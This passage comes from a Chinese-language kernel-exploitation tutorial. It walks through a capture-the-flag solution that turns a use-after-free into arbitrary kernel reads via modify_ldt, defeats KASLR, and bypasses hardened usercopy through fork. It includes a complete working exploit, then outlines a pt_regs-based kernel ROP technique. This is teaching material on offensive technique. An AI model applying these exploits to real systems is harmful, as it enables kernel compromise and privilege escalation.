This cast gives us an int-sized value in %rax</span><br><span class="hljs-comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span><br><span class="hljs-comment">     * the compiler does not try to sign-extend the negative</span><br><span class="hljs-comment">     * return codes into the high half of the register when</span><br><span class="hljs-comment">     * taking the value from int-&gt;long.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>对于 <code>write_ldt()</code> 而言其最终会调用 <code>alloc_ldt_struct()</code> 分配 ldt 结构体，由于走的是通用的分配路径所以我们可以在该结构体上完成 UAF ：）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> ldt_struct *<span class="hljs-title function_">alloc_ldt_struct</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> *<span class="hljs-title">new_ldt</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_size;<br><br>    <span class="hljs-keyword">if</span> (num_entries &gt; LDT_ENTRIES)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    new_ldt = kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ldt_struct), GFP_KERNEL);<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>而 <code>read_ldt()</code> 就是简单的读出 LDT 表上内容到用户空间，由于我们有无限制的 UAF，故可以<strong>修改 ldt-&gt;entries 完成内核空间中的任意地址读</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read_ldt</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *ptr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytecount)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;<br>        retval = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out_unlock;<br>    &#125;<br><span class="hljs-comment">//...</span><br>out_unlock:<br>    up_read(&amp;mm-&gt;context.ldt_usr_sem);<br>    <span class="hljs-keyword">return</span> retval;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>read_ldt()</code> 还能帮助我们绕过 KASLR ，这里我们要用到 <code>copy_to_user()</code> 的一个特性：对于非法地址，其<strong>并不会造成 kernel panic，只会返回一个非零的错误码</strong>，我们不难想到的是，我们可以多次修改 ldt-&gt;entries 并多次调用 modify_ldt() 以<strong>爆破内核的 page_offset_base</strong>，若是成功命中，则 modify_ldt 会返回给我们一个非负值</p>
<p>不过由于 hardened usercopy 的存在，我们并不能够直接读取内核代码段或是线性映射区中大小不符的对象的内容，否则会造成 kernel panic ：( </p>
<h5 id="Step-II-利用-fork-绕过-hardened-usercopy"><a href="#Step-II-利用-fork-绕过-hardened-usercopy" class="headerlink" title="Step.II - 利用 fork 绕过 hardened usercopy"></a>Step.II - 利用 fork 绕过 hardened usercopy</h5><p>虽然在用户空间与内核空间之间的数据拷贝存在 hardened usercopy，<strong>但是在内核空间到内核空间的数据拷贝间并不存在类似的保护机制</strong>，因此我们可以通过一些手段绕过 hardended usercopy</p>
<p>阅读 Linux 内核源码，我们不难观察到当进程调用 <code>fork()</code>  时，内核会通过 <code>memcpy()</code> 将父进程的 <code>ldt-&gt;entries</code> 上的内容拷贝给子进程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span><br><span class="hljs-comment"> * the new task is not running, so nothing can be installed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ldt_dup_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *old_mm, <span class="hljs-keyword">struct</span> mm_struct *mm)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,<br>           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);<br><br>       <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>该操作<strong>是完全处在内核中的操作</strong>，因此不会触发 hardened usercopy 的检查，我们只需要在父进程中设定好搜索的地址之后再开子进程来用 read_ldt() 读取数据即可：）</p>
<h4 id="③-FINAL-EXPLOIT-4"><a href="#③-FINAL-EXPLOIT-4" class="headerlink" title="③ FINAL EXPLOIT"></a>③ FINAL EXPLOIT</h4><p>最后的 exp 如下，这也是笔者在比赛时所用的解法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> idx;<br>    <span class="hljs-type">uint32_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] %s \n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx, <span class="hljs-type">uint32_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xDEADBEEF</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xC0DECAFE</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_desc</span> <span class="hljs-title">desc</span>;</span><br>    <span class="hljs-type">uint64_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>;<br>    <span class="hljs-type">uint64_t</span> secondary_startup_64;<br>    <span class="hljs-type">uint64_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset;<br>    <span class="hljs-type">uint64_t</span> search_addr, flag_addr = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">uint64_t</span> temp;<br>    <span class="hljs-type">uint64_t</span> ldt_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> retval;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    <span class="hljs-comment">/* bind to CPU core 0 */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init descriptor info */</span><br>    desc.base_addr = <span class="hljs-number">0xff0000</span>;<br>    desc.entry_number = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>    desc.limit = <span class="hljs-number">0</span>;<br>    desc.seg_32bit = <span class="hljs-number">0</span>;<br>    desc.contents = <span class="hljs-number">0</span>;<br>    desc.limit_in_pages = <span class="hljs-number">0</span>;<br>    desc.lm = <span class="hljs-number">0</span>;<br>    desc.read_exec_only = <span class="hljs-number">0</span>;<br>    desc.seg_not_present = <span class="hljs-number">0</span>;<br>    desc.useable = <span class="hljs-number">0</span>;<br><br>    alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;arttnba3rat3bant&quot;</span>);<br>    del(<span class="hljs-number">0</span>);<br>    syscall(SYS_modify_ldt, <span class="hljs-number">1</span>, &amp;desc, <span class="hljs-keyword">sizeof</span>(desc));<br><br>    <span class="hljs-comment">/* leak kernel direct mapping area by modify_ldt() */</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>        ldt_buf[<span class="hljs-number">0</span>] = page_offset_base;<br>        ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>        del(<span class="hljs-number">0</span>);<br>        alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>        retval = syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, &amp;temp, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (retval &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] read data: 0x%lx\n&quot;</span>, temp);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;no mm-&gt;context.ldt!&quot;</span>);<br>        &#125;<br>        page_offset_base += <span class="hljs-number">0x1000000</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);<br><br>    <span class="hljs-comment">/* leak kernel base from direct mappinig area by modify_ldt() */</span><br>    ldt_buf[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span>;<br>    ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>    del(<span class="hljs-number">0</span>);<br>    alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>    syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, &amp;secondary_startup_64, <span class="hljs-number">8</span>);<br>    kernel_offset = secondary_startup_64 - <span class="hljs-number">0xffffffff81000060</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Get  secondary_startup_64: 0x%lx\n&quot;</span>, secondary_startup_64);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_base: 0x%lx\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_offset: 0x%lx\n&quot;</span>, kernel_offset);<br><br>    <span class="hljs-comment">/* search for flag in kernel space */</span><br>    search_addr = page_offset_base;<br>    pipe(pipe_fd);<br>    buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x8000</span>, <br>                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <br>                        <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>        ldt_buf[<span class="hljs-number">0</span>] = search_addr;<br>        ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>        del(<span class="hljs-number">0</span>);<br>        alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>        <span class="hljs-type">int</span> ret = fork();<br>        <span class="hljs-keyword">if</span> (!ret) &#123; <span class="hljs-comment">// child</span><br>            <span class="hljs-type">char</span> *result_addr;<br><br>            syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, buf, <span class="hljs-number">0x8000</span>);<br>            result_addr = memmem(buf, <span class="hljs-number">0x8000</span>, <span class="hljs-string">&quot;rwctf&#123;&quot;</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span> (result_addr) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++) &#123;<br>                    <span class="hljs-keyword">if</span> (result_addr[i] == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>                        flag_addr = search_addr + (<span class="hljs-type">uint64_t</span>)(result_addr - buf);<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found flag at addr: 0x%lx\n&quot;</span>, flag_addr);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            write(pipe_fd[<span class="hljs-number">1</span>], &amp;flag_addr, <span class="hljs-number">8</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        wait(<span class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;flag_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (flag_addr != <span class="hljs-number">-1</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        search_addr += <span class="hljs-number">0x8000</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* read flag */</span><br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));<br>    ldt_buf[<span class="hljs-number">0</span>] = flag_addr;<br>    ldt_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8000</span> / <span class="hljs-number">8</span>;<br>    del(<span class="hljs-number">0</span>);<br>    alloc(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, ldt_buf);<br>    syscall(SYS_modify_ldt, <span class="hljs-number">0</span>, flag, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] flag: %s\n&quot;</span>, flag);<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可获得 flag：</p>
<p><img src="https://s2.loli.net/2023/02/20/7Qs1gHdklStc2Zb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="利用-pt-regs-构造通用-kernel-ROP（may-obsolete）"><a href="#利用-pt-regs-构造通用-kernel-ROP（may-obsolete）" class="headerlink" title="利用 pt_regs 构造通用 kernel ROP（may obsolete）"></a><em>利用 pt_regs 构造通用 kernel ROP（may obsolete）</em></h2><h3 id="pre-前置条件"><a href="#pre-前置条件" class="headerlink" title="pre.前置条件"></a>pre.前置条件</h3><p>可以控制内核执行流（劫持至少一个指针），（可选）已经泄露内核基址</p>
<h3 id="系统调用-与-pt-regs-结构体"><a href="#系统调用-与-pt-regs-结构体" class="headerlink" title="系统调用 与 pt_regs 结构体"></a>系统调用 与 pt_regs 结构体</h3><p>系统调用的本质是什么？或许不少人都能够答得上来是由我们在用户态布置好相应的参数后执行 <code>syscall</code> 这一汇编指令，通过门结构进入到内核中的 <code>entry_SYSCALL_64</code>这一函数，随后通过系统调用表跳转到对应的函数</p>
<p>现在让我们将目光放到 <code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，观察，我们不难发现其有着<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">这样一条指令</a>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br></code></pre></td></tr></table></figure>

<p>这是一条十分有趣的指令，它会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底，<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">定义</a>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在内核栈上的结构如下：</p>
<p><img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="内核栈-与通用-ROP"><a href="#内核栈-与通用-ROP" class="headerlink" title="内核栈 与通用 ROP"></a>内核栈 与通用 ROP</h3><p>我们都知道，内核栈<strong>只有一个页面的大小</strong>，而 pt_regs 结构体则固定位于<strong>内核栈栈底</strong>，当我们劫持内核结构体中的某个函数指针时（例如 seq_operations-&gt;start），在我们通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p>
<p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，<strong>这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：</strong></p>
<ul>
<li><strong>只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 便能够完成 ROP</strong></li>
</ul>
<p>这是一个通用的 ROP 板子，方便调试时观察：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0x88888888;&quot;</span><br>    <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="hljs-comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>);<br></code></pre></td></tr></table></figure>

